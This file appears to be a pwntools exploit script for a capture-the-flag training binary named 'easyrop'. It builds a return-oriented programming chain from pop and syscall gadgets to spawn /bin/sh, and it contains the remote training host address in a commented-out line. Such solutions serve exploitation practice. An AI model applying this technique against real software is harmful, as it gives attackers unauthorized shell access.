#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = process("./easyrop")
gdb.attach(r, """
	b *0x00400291
	c
	""")

#r = remote("training.jinblack.it", 2015)
input("wait")

print(r.recvuntil("easyROP!\n"))

i = 0
while i < 14:
	r.send(p32(i))
	r.send(p32(i))
	print(r.recv(4))
	i = i+1


#first gadget to pop
r.send(p32(0x004001c2))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#rdi
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)


#rsi  <--/bin/sh
r.send(p32(0x00600370))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00000000))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)


#rdx
r.send(p32(0x8))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

#rax
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#second gadget
r.send(p32(0x00400162))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
'''
#first gadget to pop
r.send(p32(0x004001c2))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#rdi
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)


#rsi  <--/bin/sh
r.send(p32(0x00600370))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00000000))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)


#rdx
r.send(p32(0x8))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

#rax
r.send(p32(0x3b))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#second gadget
r.send(p32(0x00400168))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

'''

r.interactive()



#0x00000000004001c2 : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
#0x0000000000400168 : syscall
#0x000000000040015f : mov esi, ecx ; mov rax, 0 ; syscall

#'/bin/bash' 0x7ffd4ce2ec8a

